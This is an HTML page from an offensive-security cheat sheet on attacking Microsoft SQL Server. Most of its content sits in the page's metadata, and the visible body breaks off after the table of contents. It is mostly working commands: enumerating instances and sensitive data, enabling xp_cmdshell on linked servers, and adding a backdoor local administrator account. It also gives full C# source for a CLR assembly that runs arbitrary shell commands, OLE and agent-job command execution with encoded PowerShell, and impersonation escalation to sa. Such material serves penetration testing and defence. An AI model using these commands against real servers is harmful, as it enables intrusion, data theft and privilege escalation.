<meta property="twitter:title" content="Mssql server cheatsheet" />
<meta name="twitter:site" content="@Zxce3_" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Mssql server cheatsheet","dateModified":"2021-03-25T00:00:00+07:00","datePublished":"2021-03-25T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/MSSQL-Server-Cheatsheet/"},"url":"http://localhost:4000/MSSQL-Server-Cheatsheet/","description":"MSSQL Server Summary Identify Instances and Databases Discover Local SQL Server Instances Discover Domain SQL Server Instances Discover Remote SQL Server Instances Identify Encrypted databases Version Query Identify Sensitive Information Get Tables from a Specific Database Gather 5 Entries from Each Column Gather 5 Entries from a Specific Table Dump common information from server to files Linked Database Crawl Links for Instances in the Domain Crawl Links for a Specific Instance Query Version of Linked Database Execute Procedure on Linked Database Determine Names of Linked Databases Determine All the Tables Names from a Selected Linked Database Gather the Top 5 Columns from a Selected Linked Table Gather Entries from a Selected Linked Column Command Execution via xp_cmdshell Extended Stored Procedure Add the extended stored procedure and list extended stored procedures CLR Assemblies Execute commands using CLR assembly Manually creating a CLR DLL and importing it OLE Automation Execute commands using OLE automation procedures Agent Jobs Execute commands through SQL Agent Job service List All Jobs External Scripts Python R Audit Checks Find and exploit impersonation opportunities Find databases that have been configured as trustworthy Manual SQL Server Queries Query Current User &amp; determine if the user is a sysadmin Current Role Current DB List all tables List all databases All Logins on Server All Database Users for a Database List All Sysadmins List All Database Roles Effective Permissions from the Server Effective Permissions from the Database Find SQL Server Logins Which can be Impersonated for the Current Database Exploiting Impersonation Exploiting Nested Impersonation References Identify Instances and Databases Discover Local SQL Server Instances Get-SQLInstanceLocal Discover Domain SQL Server Instances Get-SQLInstanceDomain -Verbose # Get Server Info for Found Instances Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose # Get Database Names Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults Discover Remote SQL Server Instances Get-SQLInstanceBroadcast -Verbose Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 Identify Encrypted databases Note: These are automatically decrypted for admins Get-SQLDatabase -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Verbose | Where-Object {$_.is_encrypted -eq &quot;True&quot;} Version Query Get-SQLInstanceDomain | Get-Query &quot;select @@version&quot; Identify Sensitive Information Get Tables from a Specific Database Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DBNameFromGet-SQLDatabaseCommand&gt; -NoDefaults Get Column Details from a Table Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DBName&gt; -TableName &lt;TableName&gt; Gather 5 Entries from Each Column Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;columnname1,columnname2,columnname3,columnname4,columnname5&gt;&quot; -Verbose -SampleSize 5 Gather 5 Entries from a Specific Table Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Query &#39;select TOP 5 * from &lt;DatabaseName&gt;.dbo.&lt;TableName&gt;&#39; Dump common information from server to files Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\\Instance1 -csv Linked Database Crawl Links for Instances in the Domain A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results Get-SQLInstanceDomain | Get-SQLServerLink -Verbose Crawl Links for a Specific Instance Get-SQLServerLinkCrawl -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Verbose Query Version of Linked Database Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DBSERVERNAME\\DBInstance&gt;`&quot;,&#39;select @@version&#39;)&quot; -Verbose Execute Procedure on Linked Database SQL&gt; EXECUTE(&#39;EXEC sp_configure &#39;&#39;show advanced options&#39;&#39;,1&#39;) at &quot;linked.database.local&quot;; SQL&gt; EXECUTE(&#39;RECONFIGURE&#39;) at &quot;linked.database.local&quot;; SQL&gt; EXECUTE(&#39;EXEC sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;&#39;) at &quot;linked.database.local&quot;; SQL&gt; EXECUTE(&#39;RECONFIGURE&#39;) at &quot;linked.database.local&quot;; SQL&gt; EXECUTE(&#39;exec xp_cmdshell whoami&#39;) at &quot;linked.database.local&quot;; Determine Names of Linked Databases tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query. Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;,&#39;select name from sys.databases&#39;)&quot; -Verbose Determine All the Tables Names from a Selected Linked Database The result is TableName which feeds into following query Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;,&#39;select name from &lt;DatabaseNameFromPreviousCommand&gt;.sys.tables&#39;)&quot; -Verbose Gather the Top 5 Columns from a Selected Linked Table The results are ColumnName and ColumnValue which feed into following query Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;,&#39;select TOP 5 * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt;&#39;)&quot; -Verbose Gather Entries from a Selected Linked Column Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;&#39;select * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt; where &lt;ColumnNameFromPreviousCommand&gt;=&lt;ColumnValueFromPreviousCommand&gt;&#39;)&quot; -Verbose Command Execution via xp_cmdshell xp_cmdshell disabled by default since SQL Server 2005 Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Command whoami Creates and adds local user backup to the local administrators group: Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Command &quot;net user backup Password1234 /add&#39; -Verbose Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Command &quot;net localgroup administrators backup /add&quot; -Verbose Extended Stored Procedure Add the extended stored procedure and list extended stored procedures Create-SQLFileXpDll -OutFile C:\\temp\\test.dll -Command &quot;echo test &gt; c:\\temp\\test.txt&quot; -ExportName xp_test Get-SQLQuery -UserName sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Query &quot;sp_addextendedproc &#39;xp_test&#39;, &#39;\\\\10.10.0.1\\temp\\test.dll&#39;&quot; Get-SQLQuery -UserName sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Query &quot;EXEC xp_test&quot; Get-SQLStoredProcedureXP -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Verbose CLR Assemblies Prerequisites: sysadmin privileges CREATE ASSEMBLY permission (or) ALTER ASSEMBLY permission (or) Execute commands using CLR assembly Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Command &quot;whoami&quot; Verbose or Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Command &quot;powershell -e &lt;base64&gt;&quot; -Verbose Manually creating a CLR DLL and importing it Create a C# DLL file with the following content, with the command : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library c:\\temp\\cmd_exec.cs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 using System; using System.Data; using System.Data.SqlClient; using System.Data.SqlTypes; using Microsoft.SqlServer.Server; using System.IO; using System.Diagnostics; using System.Text; public partial class StoredProcedures { [Microsoft.SqlServer.Server.SqlProcedure] public static void cmd_exec (SqlString execCommand) { Process proc = new Process(); proc.StartInfo.FileName = @&quot;C:\\Windows\\System32\\cmd.exe&quot;; proc.StartInfo.Arguments = string.Format(@&quot; /C {0}&quot;, execCommand.Value); proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); // Create the record and specify the metadata for the columns. SqlDataRecord record = new SqlDataRecord(new SqlMetaData(&quot;output&quot;, SqlDbType.NVarChar, 4000)); // Mark the beginning of the result set. SqlContext.Pipe.SendResultsStart(record); // Set values for each column in the row record.SetString(0, proc.StandardOutput.ReadToEnd().ToString()); // Send the row back to the client. SqlContext.Pipe.SendResultsRow(record); // Mark the end of the result set. SqlContext.Pipe.SendResultsEnd(); proc.WaitForExit(); proc.Close(); } }; Then follow these instructions: Enable show advanced options on the server 1 2 3 sp_configure &#39;show advanced options&#39;,1; RECONFIGURE GO Enable CLR on the server 1 2 3 sp_configure &#39;clr enabled&#39;,1 RECONFIGURE GO Import the assembly 1 2 3 CREATE ASSEMBLY my_assembly FROM &#39;c:\\temp\\cmd_exec.dll&#39; WITH PERMISSION_SET = UNSAFE; Link the assembly to a stored procedure 1 2 CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec]; GO Execute and clean 1 2 3 cmd_exec &quot;whoami&quot; DROP PROCEDURE cmd_exec DROP ASSEMBLY my_assembly CREATE ASSEMBLY will also accept an hexadecimal string representation of a CLR DLL 1 2 3 4 CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 0x4D5A90000300000004000000F[TRUNCATED] WITH PERMISSION_SET = UNSAFE GO OLE Automation Execute commands using OLE automation procedures Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Command &quot;whoami&quot; Verbose # Enable OLE Automation EXEC sp_configure &#39;show advanced options&#39;, 1 EXEC sp_configure reconfigure EXEC sp_configure &#39;OLE Automation Procedures&#39;, 1 EXEC sp_configure reconfigure # Execute commands DECLARE @execmd INT EXEC SP_OACREATE &#39;wscript.shell&#39;, @execmd OUTPUT EXEC SP_OAMETHOD @execmd, &#39;run&#39;, null, &#39;%systemroot%\\system32\\cmd.exe /c&#39; Agent Jobs Execute commands through SQL Agent Job service Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Command &quot;powershell e &lt;base64encodedscript&gt;&quot; -Verbose Subsystem Options: –Subsystem CmdExec -SubSystem PowerShell –Subsystem VBScript –Subsystem Jscript List All Jobs Get-SQLAgentJob -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -username sa -Password Password1234 -Verbose External Scripts :warning: You need to enable external scripts. 1 2 sp_configure &#39;external scripts enabled&#39;, 1; RECONFIGURE; Python: Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Command &quot;powershell -e &lt;base64encodedscript&gt;&quot; -Verbose R Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Command &quot;powershell -e &lt;base64encodedscript&gt;&quot; -Verbose Audit Checks Find and exploit impersonation opportunities Impersonate as: EXECUTE AS LOGIN = &#39;sa&#39; Impersonate dbo with DB_OWNER 1 2 3 SQL&gt; select is_member(&#39;db_owner&#39;); SQL&gt; execute as user = &#39;dbo&#39; SQL&gt; SELECT is_srvrolemember(&#39;sysadmin&#39;) Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Exploit -Verbose # impersonate sa account powerpick Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Query &quot;EXECUTE AS LOGIN = &#39;sa&#39;; SELECT IS_SRVROLEMEMBER(&#39;&#39;sysadmin&#39;&#39;)&quot; -Verbose -Debug Find databases that have been configured as trustworthy Invoke-SQLAuditPrivTrustworthy -Instance &quot;&lt;DBSERVERNAME\\DBInstance&gt;&quot; -Exploit -Verbose The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound. Invoke-SQLAuditPrivXpDirtree Invoke-SQLUncPathInjection Invoke-SQLAuditPrivXpFileexist Manual SQL Server Queries Query Current User &amp; determine if the user is a sysadmin 1 2 3 select suser_sname() Select system_user select is_srvrolemember(&#39;sysadmin&#39;) Current Role 1 Select user Current DB 1 select db_name() List all tables 1 select table_name from information_schema.tables List all databases 1 select name from master..sysdatabases All Logins on Server 1 Select * from sys.server_principals where type_desc != &#39;SERVER_ROLE&#39; All Database Users for a Database 1 Select * from sys.database_principals where type_desc != &#39;database_role&#39;; List All Sysadmins 1 SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER (&#39;sysadmin&#39;,name) = 1 List All Database Roles 1 2 3 4 5 6 7 8 9 SELECT DB1.name AS DatabaseRoleName, isnull (DB2.name, &#39;No members&#39;) AS DatabaseUserName FROM sys.database_role_members AS DRM RIGHT OUTER JOIN sys.database_principals AS DB1 ON DRM.role_principal_id = DB1.principal_id LEFT OUTER JOIN sys.database_principals AS DB2 ON DRM.member_principal_id = DB2.principal_id WHERE DB1.type = &#39;R&#39; ORDER BY DB1.name; Effective Permissions from the Server 1 select * from fn_my_permissions(null, &#39;server&#39;); Effective Permissions from the Database 1 SELECT * FROM fn_dp1my_permissions(NULL, &#39;DATABASE&#39;); Find SQL Server Logins Which can be Impersonated for the Current Database 1 2 3 4 5 select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = &#39;impersonate&#39; Exploiting Impersonation 1 2 3 4 5 6 SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) EXECUTE AS LOGIN = &#39;adminuser&#39; SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) SELECT ORIGINAL_LOGIN() Exploiting Nested Impersonation 1 2 3 4 5 6 7 8 SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) EXECUTE AS LOGIN = &#39;stduser&#39; SELECT SYSTEM_USER EXECUTE AS LOGIN = &#39;sa&#39; SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) SELECT ORIGINAL_LOGIN() SELECT SYSTEM_USER References PowerUpSQL Cheat Sheet &amp; SQL Server Queries - Leo Pitt PowerUpSQL Cheat Sheet - Scott Sutherland Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Mssql server   cheatsheet | PayloadsAllTheThings
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="PayloadsAllTheThings">
<meta name="application-name" content="PayloadsAllTheThings">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- Google Tag and Analytics -->
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BJ57VSC3B5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BJ57VSC3B5');
</script>
<!-- Translate website -->
<script>
/*
  function googleTranslateElementInit() {

  new google.translate.TranslateElement(
    {
      pageLanguage: "en",
      includedLanguages: "en,id",
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    },
    "google_translate_element"
  );
}
setTimeout( function() {
  googleTranslateElementInit();
  }, 500);
*/
</script>
  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->
<!-- <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>





</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/logo.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">PayloadsAllTheThings</a>
    </div>

    <div class="site-subtitle font-italic">A list of useful payloads</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/Zxce3" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/Zxce3_" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['Zxce3','protonmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>Mssql server   cheatsheet</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->






<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Mssql server   cheatsheet</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Zxce3
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Thu, Mar 25, 2021, 12:00 AM +0700"
  

  
  prep="on" >

  
  

  
    Mar 25, 2021
  

  <i class="unloaded">2021-03-25T00:00:00+07:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1594 words">8 min reads</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <h1 id="mssql-server">MSSQL Server</h1>

<h2 id="summary">Summary</h2>

<ul>
  <li><a href="#identifiy-instaces-and-databases">Identify Instances and Databases</a>
    <ul>
      <li><a href="#discover-local-sql-server-instances">Discover Local SQL Server Instances</a></li>
      <li><a href="#discover-domain-sql-server-instances">Discover Domain SQL Server Instances</a></li>
      <li><a href="#discover-remote-sql-instances">Discover Remote SQL Server Instances</a></li>
      <li><a href="#identifiy-encrypted-databases">Identify Encrypted databases</a></li>
      <li><a href="#version-query">Version Query</a></li>
    </ul>
  </li>
  <li><a href="#identify-sensitive-information">Identify Sensitive Information</a>
    <ul>
      <li><a href="#get-tables-from-specific-databases">Get Tables from a Specific Database</a></li>
      <li><a href="#gather-5-entries-from-each-column">Gather 5 Entries from Each Column</a></li>
      <li><a href="#gather-5-entries-from-a-specific-table">Gather 5 Entries from a Specific Table</a></li>
      <li><a href="#dump-common-information-from-server-to-files">Dump common information from server to files</a></li>
    </ul>
  </li>
  <li><a href="#linked-database">Linked Database</a>
    <ul>
      <li><a href="#crawl-links-for-instances-in-the-domain">Crawl Links for Instances in the Domain</a></li>
      <li><a href="#crawl-links-for-a-specific-instance">Crawl Links for a Specific Instance</a></li>
      <li><a href="#query-version-of-linked-database">Query Version of Linked Database</a></li>
      <li><a href="#execute-procedure-on-linked-database">Execute Procedure on Linked Database</a></li>
      <li><a href="#determine-names-of-linked-databases">Determine Names of Linked Databases </a></li>
      <li><a href="#determine-all-the-tables-names-from-a-selected-linked-database">Determine All the Tables Names from a Selected Linked Database</a></li>
      <li><a href="#gather-the-top-5-columns-from-a-selected-linked-table">Gather the Top 5 Columns from a Selected Linked Table</a></li>
      <li><a href="#gather-entries-from-a-selected-linked-column">Gather Entries from a Selected Linked Column</a></li>
      <li><a href="#command-execution-via-xp_cmdshell">Command Execution via xp_cmdshell</a></li>
    </ul>
  </li>
  <li><a href="#extended-stored-procedure">Extended Stored Procedure</a>
    <ul>
      <li><a href="#add-the-extended-stored-procedure-and-list-extended-stored-procedures">Add the extended stored procedure and list extended stored procedures</a></li>
    </ul>
  </li>
  <li><a href="#clr-assemblies">CLR Assemblies</a>
    <ul>
      <li><a href="#execute-commands-using-clr-assembly">Execute commands using CLR assembly</a></li>
      <li><a href="#manually-creating-a-clr-dll-and-importing-it">Manually creating a CLR DLL and importing it</a></li>
    </ul>
  </li>
  <li><a href="#ole-automation">OLE Automation</a>
    <ul>
      <li><a href="#execute-commands-using-ole-automation-procedures">Execute commands using OLE automation procedures</a></li>
    </ul>
  </li>
  <li><a href="#agent-jobs">Agent Jobs</a>
    <ul>
      <li><a href="#execute-commands-through-sql-agent-job-service">Execute commands through SQL Agent Job service</a></li>
      <li><a href="#list-all-jobs">List All Jobs</a></li>
    </ul>
  </li>
  <li><a href="#external-scripts">External Scripts</a>
    <ul>
      <li><a href="#python">Python</a></li>
      <li><a href="#r">R</a></li>
    </ul>
  </li>
  <li><a href="#audit-checks">Audit Checks</a>
    <ul>
      <li><a href="#find-and-exploit-impersonation-opportunities">Find and exploit impersonation opportunities</a></li>
    </ul>
  </li>
  <li><a href="#find-databases-that-have-been-configured-as-trustworthy">Find databases that have been configured as trustworthy</a></li>
  <li><a href="#manual-sql-server-queries">Manual SQL Server Queries</a>
    <ul>
      <li><a href="#query-current-user--determine-if-the-user-is-a-sysadmin">Query Current User &amp; determine if the user is a sysadmin</a></li>
      <li><a href="#current-role">Current Role</a></li>
      <li><a href="#current-db">Current DB</a></li>
      <li><a href="#list-all-tables">List all tables</a></li>
      <li><a href="#list-all-databases">List all databases</a></li>
      <li><a href="#all-logins-on-server">All Logins on Server</a></li>
      <li><a href="#all-database-users-for-a-database">All Database Users for a Database</a></li>
      <li><a href="#list-all-sysadmins">List All Sysadmins</a></li>
